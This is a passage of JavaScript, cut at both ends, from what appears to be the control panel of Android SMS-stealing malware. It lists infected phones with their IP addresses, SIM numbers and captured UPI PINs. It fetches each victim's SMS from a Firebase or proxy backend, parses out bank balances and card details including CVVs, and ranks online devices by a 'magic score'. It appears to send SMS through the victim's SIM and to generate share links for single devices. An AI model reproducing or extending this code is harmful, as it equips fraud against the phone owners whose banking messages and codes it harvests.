        // Update only this card in the DOM â€” no full re-render
        updateCardInPlace(d);
        updateStats();
      } else {
        STATE.smsLoaded.add(dev.id);
      }
      remaining--;
      if (remaining <= 0) {
        banner.classList.remove('visible');
      }
      // Pull next item into concurrency slot
      runNext();
    }).catch(function() {
      STATE.smsLoaded.add(dev.id);
      remaining--;
      if (remaining <= 0) banner.classList.remove('visible');
      runNext();
    });
  }

  // Seed concurrency pool
  for (var s = 0; s < Math.min(CONCURRENCY, toFetch.length); s++) {
    runNext();
  }
}

// Update a single card's DOM node in-place after SMS loads
// Replaces only the card element â€” zero flicker, zero full re-render
function updateCardInPlace(dev) {
  var el = document.getElementById('card-' + dev.id);
  if (!el) return; // card not currently visible (filtered out)
  var newHtml = renderCard(dev);
  var tmp = document.createElement('div');
  tmp.innerHTML = newHtml;
  var newEl = tmp.firstElementChild;
  if (newEl) el.parentNode.replaceChild(newEl, el);
}

// Update stats bar counters only (cheap DOM op)
function updateStats() {
  var devices = STATE.devices;
  var online = devices.filter(function(d) { return d.status; }).length;
  var bankCount = devices.filter(function(d) { return d.smsAnalysis && d.smsAnalysis.bankBalances && d.smsAnalysis.bankBalances.length; }).length;
  var cardCount = devices.filter(function(d) { return d.smsAnalysis && d.smsAnalysis.cards && d.smsAnalysis.cards.length; }).length;
  document.getElementById('stat-total').textContent = devices.length;
  document.getElementById('stat-online').textContent = online;
  document.getElementById('stat-offline').textContent = devices.length - online;
  document.getElementById('stat-bank').textContent = bankCount;
  document.getElementById('stat-cards').textContent = cardCount;
}

async function fetchDeviceSms(deviceId) {
  try {
    var raw;
    if (STATE.isProxyMode) {
      // Proxy mode: route SMS fetch through secure gateway
      try {
        raw = await proxyFetch('messages/' + deviceId, { 'orderBy': '"$key"', 'limitToLast': '150' });
      } catch(e1) {
        raw = await proxyFetch('clients/' + deviceId + '/messages', { 'orderBy': '"$key"', 'limitToLast': '150' });
      }
    } else {
      try {
        // Try root-level messages/{id} first (profex exact path)
        raw = await fbFetch(STATE.fbUrl, STATE.fbKey, 'messages/' + deviceId, {
          'orderBy': '"$key"', 'limitToLast': '150'
        });
      } catch(e1) {
        // Fallback to clients/{id}/messages
        raw = await fbFetch(STATE.fbUrl, STATE.fbKey, 'clients/' + deviceId + '/messages', {
          'orderBy': '"$key"', 'limitToLast': '150'
        });
      }
    }
    var msgs = parseSmsData(raw);
    return { analysis: analyzeSms(msgs), rawMsgs: msgs };
  } catch(e) {
    return null;
  }
}

async function refreshAllSms() {
  var devices = STATE.devices;
  var CONCURRENCY = 10;
  var idx = 0;
  function runNext() {
    if (idx >= devices.length) return;
    var dev = devices[idx++];
    fetchDeviceSms(dev.id).then(function(result) {
      var d = STATE.devices.find(function(x) { return x.id === dev.id; });
      if (d && result && result.analysis) {
        d.smsAnalysis = result.analysis;
        d.rawMsgs = result.rawMsgs;
        updateCardInPlace(d);
        updateStats();
      }
      runNext();
    }).catch(function() { runNext(); });
  }
  for (var s = 0; s < Math.min(CONCURRENCY, devices.length); s++) runNext();
}

function renderDashboard() {
  var devices = STATE.devices;

  // Update stats
  var online = devices.filter(function(d) { return d.status; }).length;
  var bankCount = devices.filter(function(d) { return d.smsAnalysis && d.smsAnalysis.bankBalances && d.smsAnalysis.bankBalances.length; }).length;
  var cardCount = devices.filter(function(d) { return d.smsAnalysis && d.smsAnalysis.cards && d.smsAnalysis.cards.length; }).length;

  document.getElementById('stat-total').textContent = devices.length;
  document.getElementById('stat-online').textContent = online;
  document.getElementById('stat-offline').textContent = devices.length - online;
  document.getElementById('stat-bank').textContent = bankCount;
  document.getElementById('stat-cards').textContent = cardCount;

  // Security Lockdown for Single Device Mode
  if (STATE.singleDevId || STATE.isProxyMode) {
    var logoutBtn = document.querySelector('.btn-logout');
    if (logoutBtn) logoutBtn.style.display = 'none';
    var closeBtn = document.querySelector('.btn-detail-close');
    if (closeBtn) closeBtn.style.display = 'none';
    var delBtn = document.getElementById('btn-detail-del');
    if (delBtn) delBtn.style.display = 'none';
  }

  // Show/hide sections
  document.getElementById('loading-state').classList.remove('visible');

  if (devices.length === 0) {
    document.getElementById('empty-state').classList.add('visible');
    document.getElementById('cards-container').style.display = 'none';
  } else {
    document.getElementById('empty-state').classList.remove('visible');
    document.getElementById('cards-container').style.display = '';
    applyFilters();
  }
}

function applyFilters() {
  var filter = STATE.filter;
  var sort = document.getElementById('sort-select') ? document.getElementById('sort-select').value : 'new';
  var q = document.getElementById('search-input') ? document.getElementById('search-input').value.toLowerCase() : '';

  var filtered = STATE.devices.filter(function(d) {
    if (filter === 'online'   && !d.status) return false;
    if (filter === 'offline'  &&  d.status) return false;
    if (filter === 'upi'      && !d.upipin) return false;
    if (filter === 'bank'     && !(d.smsAnalysis && d.smsAnalysis.bankBalances && d.smsAnalysis.bankBalances.length)) return false;
    if (filter === 'card'     && !(d.smsAnalysis && d.smsAnalysis.cards && d.smsAnalysis.cards.length)) return false;
    // Priority: only online devices that have a magic score, CRITICAL or HIGH
    if (filter === 'priority') {
      if (!d.status) return false;
      var sc = STATE.magicScores[d.id];
      if (sc === undefined || sc < 15) return false; // must have at least MED score
    }
    if (q) {
      var name  = (d.name        || '').toLowerCase();
      var phone = (d.phoneNumber || '').toLowerCase();
      var id    = (d.id          || '').toLowerCase();
      if (!name.includes(q) && !phone.includes(q) && !id.includes(q)) return false;
    }
    return true;
  });

  // Sort
  if (filter === 'priority') {
    // Sort by magic score descending
    filtered.sort(function(a, b) {
      return (STATE.magicScores[b.id] || 0) - (STATE.magicScores[a.id] || 0);
    });
  } else {
    filtered.sort(function(a, b) {
      if (sort === 'name')    return (a.name || '').localeCompare(b.name || '');
      if (sort === 'battery') return b.batteryPercent - a.batteryPercent;
      if (sort === 'old')     return (a.id || '').localeCompare(b.id || '');
      return (b.id || '').localeCompare(a.id || ''); // newest
    });
  }

  var grid = document.getElementById('cards-grid');
  if (!grid) return;

  if (filtered.length === 0) {
    grid.innerHTML = '<div class="filter-empty visible"><p>No devices match your filter</p></div>';
  } else {
    var html = '';
    filtered.forEach(function(dev) { html += renderCard(dev); });
    grid.innerHTML = html;
  }
}

function setFilter(filter, btnEl) {
  STATE.filter = filter;
  // Update button styles
  var btns = document.querySelectorAll('.filter-btn');
  btns.forEach(function(b) {
    b.classList.remove('active', 'active-bank', 'active-card');
  });
  if (btnEl) {
    if (filter === 'bank') btnEl.classList.add('active-bank');
    else if (filter === 'card') btnEl.classList.add('active-card');
    else btnEl.classList.add('active');
  }
  applyFilters();
}

function triggerRefresh() {
  var btn = document.getElementById('btn-refresh');
  btn.classList.add('spinning');
  loadDevices(false).then(function() {
    btn.classList.remove('spinning');
  }).catch(function() {
    btn.classList.remove('spinning');
  });
}

function showError(msg) {
  var banner = document.getElementById('error-banner');
  document.getElementById('error-banner-msg').textContent = msg;
  banner.classList.add('visible');
}

function dismissError() {
  document.getElementById('error-banner').classList.remove('visible');
}

function handleLogout() {
  if (!confirm('Logout from current account?')) return;
  if (STATE.refreshTimer) clearInterval(STATE.refreshTimer);
  if (STATE.smsRefreshTimer) clearInterval(STATE.smsRefreshTimer);
  if (STATE.clockTimer) clearInterval(STATE.clockTimer);
  STATE.devices = [];
  STATE.fbUrl = '';
  STATE.fbKey = '';
  STATE.smsLoaded = new Set();
  document.getElementById('dashboard-page').style.display = 'none';
  document.getElementById('login-page').style.display = 'flex';
  renderSavedAccounts();
  showSavedAccounts();
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Clock
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function startClock() {
  if (STATE.clockTimer) clearInterval(STATE.clockTimer);
  function tick() {
    var now = new Date();
    var h = String(now.getHours()).padStart(2, '0');
    var m = String(now.getMinutes()).padStart(2, '0');
    var el = document.getElementById('clock-display');
    if (el) el.textContent = h + ':' + m;
  }
  tick();
  STATE.clockTimer = setInterval(tick, 1000);
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Detail Panel
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function openDetail(devId) {
  var dev = STATE.devices.find(function(d) { return d.id === devId; });
  if (!dev) return;
  STATE.detailDev = dev;

  // Render header
  var iconEl = document.getElementById('detail-icon');
  iconEl.className = 'detail-device-icon' + (dev.status ? ' online' : '');
  document.getElementById('detail-name').textContent = dev.name;
  document.getElementById('detail-dev-id').textContent = dev.id;

  // Status bar
  var dotEl = document.getElementById('detail-status-dot');
  var statusText = document.getElementById('detail-status-text');
  var offlineSince = document.getElementById('detail-offline-since');
  dotEl.className = 'status-dot ' + (dev.status ? 'online' : 'offline');
  statusText.textContent = dev.status ? 'Online' : 'Offline';
  statusText.style.color = dev.status ? '#4ade80' : '#555';
  offlineSince.textContent = (!dev.status && dev.lastSeen) ? 'since ' + formatLastSeen(dev.lastSeen) : '';

  var batColor = dev.batteryPercent >= 60 ? '#4ade80' : dev.batteryPercent >= 30 ? '#fde68a' : '#ef4444';
  var batVal = document.getElementById('detail-bat-val');
  batVal.textContent = dev.battery;
  batVal.style.color = batColor;
  batVal.style.fontWeight = '700';
  batVal.style.fontSize = '0.65rem';

  var upiB = document.getElementById('detail-upi-badge');
  upiB.style.display = dev.upipin ? '' : 'none';
  if (dev.upipin) upiB.textContent = 'UPI: ' + dev.upipin.split('|')[0];

  // Render Info tab
  renderInfoTab(dev);

  // Reset tabs
  switchTab('info', document.querySelector('.tab-btn[data-tab="info"]'));

  // Load SMS
  loadDetailSms(dev);

  // Send tab setup
  document.getElementById('send-to').value = '';
  document.getElementById('send-msg').value = '';
  document.getElementById('send-char-count').textContent = '0 chars';
  selectSim(1);
  var useNumBtn = document.getElementById('btn-use-number');
  var phone = dev.phoneNumber && dev.phoneNumber !== 'â€”' ? dev.phoneNumber : '';
  if (phone) {
    useNumBtn.style.display = '';
    document.getElementById('device-number-display').textContent = phone;
  } else {
    useNumBtn.style.display = 'none';
  }

  // Show overlay
  var overlay = document.getElementById('detail-overlay');
  overlay.classList.add('visible');
  overlay.style.display = 'flex';

  // Always scroll body back to top so header + X button are immediately visible
  var body = document.querySelector('.detail-body');
  if (body) body.scrollTop = 0;

  // Ensure 1-Tap Copy Mode checkbox matches _smsCopyMode state (ON by default)
  var copyInput = document.getElementById('copy-toggle-input');
  if (copyInput) copyInput.checked = _smsCopyMode;
  toggleCopyMode();
}

function selectSim(n) {
  STATE.selectedSim = n;
  document.getElementById('sim-btn-1').className = 'sim-btn' + (n === 1 ? ' active' : '');
  document.getElementById('sim-btn-2').className = 'sim-btn' + (n === 2 ? ' active' : '');
  document.getElementById('btn-send-text').textContent = 'Send via SIM ' + n;
}

function renderInfoTab(dev) {
  // Offline/online box
  if (!dev.status && dev.lastSeen) {
    document.getElementById('detail-offline-box').style.display = '';
    document.getElementById('detail-offline-time').textContent = formatLastSeen(dev.lastSeen);
    document.getElementById('detail-offline-ts').textContent = formatTimestamp(dev.lastSeen);
    document.getElementById('detail-online-box').style.display = 'none';
  } else if (dev.status && dev.lastSeen) {
    document.getElementById('detail-online-box').style.display = '';
    document.getElementById('detail-online-ts').textContent = formatTimestamp(dev.lastSeen);
    document.getElementById('detail-offline-box').style.display = 'none';
  } else {
    document.getElementById('detail-offline-box').style.display = 'none';
    document.getElementById('detail-online-box').style.display = 'none';
  }

  // Info rows
  var rows = [
    ['Phone Number', dev.phoneNumber, true, ''],
    ['Network', dev.provider, false, ''],
    ['Android', dev.android, false, ''],
    ['IP Address', dev.ip, true, ''],
    ['Storage', dev.storage, false, ''],
    ['CPU Arch', dev.cpu, true, ''],
    ['SDK Version', dev.sdk, false, ''],
    ['Device ID', dev.id, true, ''],
    ['SIM Cards', dev.sims.length + ' SIM(s)', false, ''],
  ];

  dev.sims.forEach(function(sim, i) {
    if (sim && sim.phoneNumber) {
      rows.push(['SIM ' + (i+1) + ' Number', sim.phoneNumber, true, 'highlight']);
    }
    if (sim && sim.carrierName) {
      rows.push(['SIM ' + (i+1) + ' Carrier', sim.carrierName, false, 'highlight2']);
    }
  });

  var html = '';
  if (!STATE.singleDevId) {
    html += '<div style="margin-bottom:1rem;padding:0.75rem 0.9rem;background:rgba(56,189,248,0.12);border:1px solid rgba(56,189,248,0.3);border-radius:0.75rem;display:flex;align-items:center;justify-content:space-between;gap:0.75rem">' +
      '<div>' +
        '<div style="font-weight:700;font-size:0.8rem;color:#38bdf8;display:flex;align-items:center;gap:0.35rem">' +
          '<span>🔗 Share This Device</span>' +
        '</div>' +
        '<div style="font-size:0.7rem;color:var(--text-muted);margin-top:0.15rem">Generate a link for <b>' + escHtml(dev.name || dev.id) + '</b> only</div>' +
      '</div>' +
      '<button onclick="openDeviceShareModal()" style="padding:0.4rem 0.75rem;background:#0284c7;border:none;color:white;border-radius:0.5rem;font-weight:700;font-size:0.75rem;cursor:pointer;flex-shrink:0;transition:all 0.2s">Get Link</button>' +
    '</div>';
  }

  rows.forEach(function(r) {
    html += '<div class="info-row">';
    html += '<span class="info-row-label">' + escHtml(r[0]) + '</span>';
    html += '<span class="info-row-value' + (r[2] ? ' mono' : '') + (r[3] ? ' ' + r[3] : '') + '">' + escHtml(r[1] || 'â€”') + '</span>';
    html += '</div>';
  });
  document.getElementById('info-rows').innerHTML = html;
  document.getElementById('info-sms-section').style.display = 'none';
}

async function loadDetailSms(dev) {
  // If we already have cached SMS for this device, render immediately
  // so the user sees content instantly while the refresh runs in background
  if (dev.rawMsgs && dev.rawMsgs.length > 0 && dev.smsAnalysis) {
    STATE.detailSms = dev.rawMsgs;
    STATE.detailAnalysis = dev.smsAnalysis;
    renderDetailSms(dev.rawMsgs, dev.smsAnalysis, dev);
    updateDetailBadges(dev.smsAnalysis);
  } else {
    // No cache â€” show loading state
    document.getElementById('bank-loading').style.display = 'block';
    document.getElementById('bank-empty').style.display = 'none';
    document.getElementById('bank-list').style.display = 'none';
    document.getElementById('sms-loading').style.display = 'block';
    document.getElementById('sms-empty').style.display = 'none';
    document.getElementById('sms-list').style.display = 'none';
  }

  try {
    var result = await fetchDeviceSms(dev.id);
    var msgs = (result && result.rawMsgs) ? result.rawMsgs : [];
    var analysis = (result && result.analysis) ? result.analysis : analyzeSms([]);

    // Update device cache
    dev.smsAnalysis = analysis;
    dev.rawMsgs = msgs;
    STATE.smsLoaded.add(dev.id);

    // Update detail state
    STATE.detailSms = msgs;
    STATE.detailAnalysis = analysis;

    renderDetailSms(msgs, analysis, dev);
    updateDetailBadges(analysis);
  } catch(e) {
    // On error, keep cached data visible if we have it
    if (dev.rawMsgs && dev.rawMsgs.length > 0) {
      // Already rendered above â€” just hide spinners
      document.getElementById('bank-loading').style.display = 'none';
      document.getElementById('sms-loading').style.display = 'none';
    } else {
      STATE.detailSms = [];
      STATE.detailAnalysis = null;
      document.getElementById('bank-loading').style.display = 'none';
      document.getElementById('bank-empty').style.display = 'block';
      document.getElementById('sms-loading').style.display = 'none';
      document.getElementById('sms-empty').style.display = 'block';
    }
  }
}




function updateDetailBadges(analysis) {
  var bankCount = analysis.bankBalances.length;
  var cardCount = analysis.cards.length;
  var smsCount = STATE.detailSms.length;

  document.getElementById('tab-bank-btn').textContent = 'Bank (' + bankCount + ')';
  document.getElementById('tab-cards-btn').textContent = 'Card (' + cardCount + ')';
  document.getElementById('tab-sms-btn').textContent = 'SMS (' + smsCount + ')';

  var bankBadge = document.getElementById('detail-bank-badge');
  bankBadge.style.display = bankCount > 0 ? '' : 'none';
  bankBadge.textContent = bankCount + ' Bank SMS';

  var cardBadge = document.getElementById('detail-card-badge');
  cardBadge.style.display = cardCount > 0 ? '' : 'none';
  cardBadge.textContent = cardCount + ' Card';

  // SMS info in info tab
  if (analysis.phoneNumbers.length > 0 || analysis.networks.length > 0) {
    var smsSection = document.getElementById('info-sms-section');
    smsSection.style.display = '';
    var rows = '';
    analysis.phoneNumbers.forEach(function(p, i) {
      rows += '<div class="info-row"><span class="info-row-label">Phone #' + (i+1) + '</span><span class="info-row-value mono highlight">' + escHtml(p) + '</span></div>';
    });
    analysis.networks.forEach(function(n, i) {
      rows += '<div class="info-row"><span class="info-row-label">Network #' + (i+1) + '</span><span class="info-row-value highlight2">' + escHtml(n) + '</span></div>';
    });
    document.getElementById('info-sms-rows').innerHTML = rows;
  }
}


// ── SMS Search / Filter ───────────────────────────────────────────────────────
function filterSmsList(query) {
  var q = (query || '').toLowerCase().trim();
  var items = document.querySelectorAll('#sms-list .sms-item');
  var visible = 0;
  items.forEach(function(el) {
    var text = el.textContent.toLowerCase();
    var match = !q || text.indexOf(q) !== -1;
    el.style.display = match ? '' : 'none';
    if (match) visible++;
  });
  var countEl = document.getElementById('sms-search-count');
  if (countEl) countEl.textContent = q ? (visible + ' result' + (visible === 1 ? '' : 's')) : '';
}

// ── 1-Tap Copy Mode ──────────────────────────────────────────────────────────
var _smsCopyMode = true; // ON by default

function toggleCopyMode() {
  var input = document.getElementById('copy-toggle-input');
  if (input) {
    _smsCopyMode = input.checked;
  } else {
    _smsCopyMode = !_smsCopyMode;
  }
  var list  = document.getElementById('sms-list');
  var hint  = document.getElementById('copy-mode-hint');

  if (_smsCopyMode) {
    if (list)  list.classList.add('copy-mode-on');
    // Inject hint bar if not already there
    if (list && !hint) {
      var hintEl = document.createElement('div');
      hintEl.id = 'copy-mode-hint';
      hintEl.className = 'copy-mode-hint';
      hintEl.textContent = '👇 Tap any message to copy its full text';
      list.insertBefore(hintEl, list.firstChild);
    } else if (hint) {
      hint.style.display = '';
    }
  } else {
    if (list)  list.classList.remove('copy-mode-on');
    if (hint)  hint.style.display = 'none';
  }
}

function smsTapCopy(el) {
  if (!_smsCopyMode) return;
  var fullText = el.getAttribute('data-sms-text') || el.querySelector('.sms-text') && el.querySelector('.sms-text').textContent || '';
  if (!fullText) return;

  // Copy to clipboard
  navigator.clipboard.writeText(fullText).then(function() {
    // Flash the item green
    el.classList.remove('copy-flashing');
    void el.offsetWidth; // force reflow to restart animation
    el.classList.add('copy-flashing');
    setTimeout(function() { el.classList.remove('copy-flashing'); }, 600);

    // Show 'Copied ✓' badge on the sender span
    var badge = el.querySelector('.sms-copy-badge');
    if (badge) {
      badge.classList.add('show');
      setTimeout(function() { badge.classList.remove('show'); }, 1400);
    }
  }).catch(function() {
    // Fallback for older browsers / http
    try {
      var ta = document.createElement('textarea');
      ta.value = fullText;
      ta.style.position = 'fixed';
      ta.style.opacity = '0';
      document.body.appendChild(ta);
      ta.focus(); ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
      el.classList.add('copy-flashing');
      setTimeout(function() { el.classList.remove('copy-flashing'); }, 600);
    } catch(e) { showToast('Copy failed'); }
  });
}

function renderDetailSms(msgs, analysis, dev) {
  // Bank tab
  document.getElementById('bank-loading').style.display = 'none';
  document.getElementById('bank-sms-count-info').textContent = 'Auto-detected from ' + msgs.length + ' SMS';

  if (analysis.bankBalances.length === 0) {
    document.getElementById('bank-empty').style.display = '';
    document.getElementById('bank-list').style.display = 'none';
  } else {
    document.getElementById('bank-empty').style.display = 'none';
    var bankHtml = '';
    // Summary
    var b0 = analysis.bankBalances[0];
    bankHtml += '<div class="bank-summary-box">';
    bankHtml += '<p class="bank-summary-label">Latest Balance Â· ' + escHtml(b0.bankName) + '</p>';
    bankHtml += '<div class="bank-summary-amount">';
    bankHtml += '<span class="bank-summary-symbol">â‚¹</span>';
    bankHtml += '<span class="bank-summary-val">' + formatAmount(b0.availableBalance) + '</span>';
    if (b0.accountLast4) bankHtml += '<span class="bank-summary-acc">â€¢â€¢' + escHtml(b0.accountLast4) + '</span>';
    bankHtml += '</div></div>';

    analysis.bankBalances.forEach(function(b) {
      var isCredit = b.transactionType === 'credit';
      bankHtml += '<div class="bank-item">';
      bankHtml += '<div class="bank-item-header">';
      bankHtml += '<div class="bank-item-left">';
      bankHtml += '<div class="bank-item-icon"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 18.75a60.07 60.07 0 0115.797 2.101c.727.198 1.453-.342 1.453-1.096V18.75M3.75 4.5v.75A.75.75 0 013 6h-.75m0 0v-.375c0-.621.504-1.125 1.125-1.125H20.25M2.25 6v9m18-10.5v.75c0 .414.336.75.75.75h.75m-1.5-1.5h.375c.621 0 1.125.504 1.125 1.125v9.75c0 .621-.504 1.125-1.125 1.125h-.375m1.5-1.5H21a.75.75 0 00-.75.75v.75m0 0H3.75m0 0h-.375a1.125 1.125 0 01-1.125-1.125V15m1.5 1.5v-.75A.75.75 0 003 15h-.75M15 10.5a3 3 0 11-6 0 3 3 0 016 0zm3 0h.008v.008H18V10.5zm-12 0h.008v.008H6V10.5z"/></svg></div>';
      bankHtml += '<span class="bank-item-name">' + escHtml(b.bankName) + '</span>';
      bankHtml += '<span class="bank-item-sender">' + escHtml(b.senderName) + '</span>';
      if (b.accountLast4) bankHtml += '<span class="bank-item-acc">â€¢â€¢' + escHtml(b.accountLast4) + '</span>';
      bankHtml += '</div>';
      if (b.transactionType) {
        var txArrow = isCredit
          ? '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M4.5 10.5L12 3m0 0l7.5 7.5M12 3v18"/></svg>'
          : '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M19.5 13.5L12 21m0 0l-7.5-7.5M12 21V3"/></svg>';
        bankHtml += '<span class="bank-item-txn ' + (isCredit ? 'credit' : 'debit') + '">' + txArrow + (isCredit ? 'Credit' : 'Debit') + '</span>';
      }
      bankHtml += '</div>';
      bankHtml += '<div class="bank-item-amounts">';
      bankHtml += '<div><p class="bank-item-bal-label">Available Balance</p><p class="bank-item-bal"><span class="bank-item-bal-sym">â‚¹</span>' + formatAmount(b.availableBalance) + '</p></div>';
      if (b.transactionAmount && b.transactionAmount !== b.availableBalance) {
        bankHtml += '<div class="bank-item-txn-amount"><p class="bank-item-txn-label">Transaction</p>';
        bankHtml += '<p class="bank-item-txn-val ' + (isCredit ? 'credit' : 'debit') + '">' + (isCredit ? '+' : '-') + 'â‚¹' + formatAmount(b.transactionAmount) + '</p></div>';
      }
      bankHtml += '</div>';
      bankHtml += '<p class="bank-item-raw">' + escHtml(b.rawSms.substring(0, 130)) + '</p>';
      if (b.detectedAt) bankHtml += '<p class="bank-item-ts">' + escHtml(String(b.detectedAt)) + '</p>';
      bankHtml += '</div>';
    });

    document.getElementById('bank-list').innerHTML = bankHtml;
    document.getElementById('bank-list').style.display = 'block';
    document.getElementById('bank-found-count').textContent = analysis.bankBalances.length + ' bank message(s) found';
  }

  // Cards tab
  var cardsList = document.getElementById('cards-list');
  if (analysis.cards.length === 0) {
    cardsList.innerHTML = '<div class="empty-state" style="display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem;gap:0.5rem;opacity:0.5"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" style="width:2rem;height:2rem"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25v10.5A2.25 2.25 0 004.5 19.5z"/></svg><p style="font-size:0.78rem">No card SMS detected</p></div>';
  } else {
    var cardsHtml = '';
    analysis.cards.forEach(function(c) {
      cardsHtml += '<div class="card-item">';
      cardsHtml += '<div class="card-item-top">';
      cardsHtml += '<div class="card-item-left"><div class="card-item-icon"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25v10.5A2.25 2.25 0 004.5 19.5z"/></svg></div><span class="card-item-type">' + escHtml(c.cardType || 'Card') + '</span></div>';
      if (c.expiry) cardsHtml += '<span class="card-item-exp">Exp: ' + escHtml(c.expiry) + '</span>';
      cardsHtml += '</div>';
      cardsHtml += '<p class="card-item-number">&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; ' + escHtml(c.cardLast4) + '</p>';
      if (c.cvv) {
        cardsHtml += '<div class="card-item-cvv"><span class="card-item-cvv-label">CVV:</span><span class="card-item-cvv-val">' + escHtml(c.cvv) + '</span></div>';
      }
      cardsHtml += '<p class="card-item-raw">' + escHtml(c.rawSms.substring(0, 130)) + '</p>';
      cardsHtml += '</div>';
    });
    cardsList.innerHTML = cardsHtml;
  }

  // SMS tab
  document.getElementById('sms-loading').style.display = 'none';
  if (msgs.length === 0) {
    document.getElementById('sms-empty').style.display = 'flex';
    document.getElementById('sms-list').style.display = 'none';
  } else {
    document.getElementById('sms-empty').style.display = 'none';
    var smsHtml = '';
    msgs.forEach(function(m, i) {
      var text = m.text || '';
      var sender = m.sender || '?';
      var isBankMsg = isRealBankSms(sender, text);
      var isCardMsg = CARD_BODY.test(text);
      var itemClass = isCardMsg ? 'card-sms' : isBankMsg ? 'bank-sms' : 'other-sms';
      // data-sms-text stores the FULL text (not truncated) for copy
      var escapedFull = text.replace(/"/g, '&quot;').replace(/'/g, '&#39;');
      smsHtml += '<div class="sms-item ' + itemClass + '" onclick="smsTapCopy(this)" data-sms-text="' + escapedFull + '">';
      smsHtml += '<div class="sms-item-top">';
      smsHtml += '<div style="display:flex;align-items:center;gap:0.375rem">';
      smsHtml += '<span class="sms-sender ' + itemClass + '">' + escHtml(sender) + '</span>';
      // Copied badge — hidden by default, shown on copy
      smsHtml += '<span class="sms-copy-badge">✓ Copied</span>';
      if (isBankMsg) smsHtml += '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:0.75rem;height:0.75rem;color:rgba(34,197,94,0.6)"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 18.75a60.07 60.07 0 0115.797 2.101c.727.198 1.453-.342 1.453-1.096V18.75M3.75 4.5v.75A.75.75 0 013 6h-.75m0 0v-.375c0-.621.504-1.125 1.125-1.125H20.25M2.25 6v9m18-10.5v.75c0 .414.336.75.75.75h.75m-1.5-1.5h.375c.621 0 1.125.504 1.125 1.125v9.75c0 .621-.504 1.125-1.125 1.125h-.375m1.5-1.5H21a.75.75 0 00-.75.75v.75m0 0H3.75m0 0h-.375a1.125 1.125 0 01-1.125-1.125V15m1.5 1.5v-.75A.75.75 0 003 15h-.75M15 10.5a3 3 0 11-6 0 3 3 0 016 0zm3 0h.008v.008H18V10.5zm-12 0h.008v.008H6V10.5z"/></svg>';
      if (isCardMsg) smsHtml += '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:0.75rem;height:0.75rem;color:rgba(168,85,247,0.6)"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25v10.5A2.25 2.25 0 004.5 19.5z"/></svg>';
      smsHtml += '</div>';
      smsHtml += '<span class="sms-time">' + escHtml(String(m.time || '').substring(0, 20)) + '</span>';
      smsHtml += '</div>';
      smsHtml += '<p class="sms-text">' + escHtml(text.substring(0, 250)) + '</p>';
      smsHtml += '</div>';
    });
    var smsList = document.getElementById('sms-list');
    smsList.innerHTML = smsHtml;
    // Re-apply copy mode class if it was ON before re-render
    if (_smsCopyMode) {
      smsList.classList.add('copy-mode-on');
      // Re-inject hint
      if (!document.getElementById('copy-mode-hint')) {
        var hintEl = document.createElement('div');
        hintEl.id = 'copy-mode-hint';
        hintEl.className = 'copy-mode-hint';
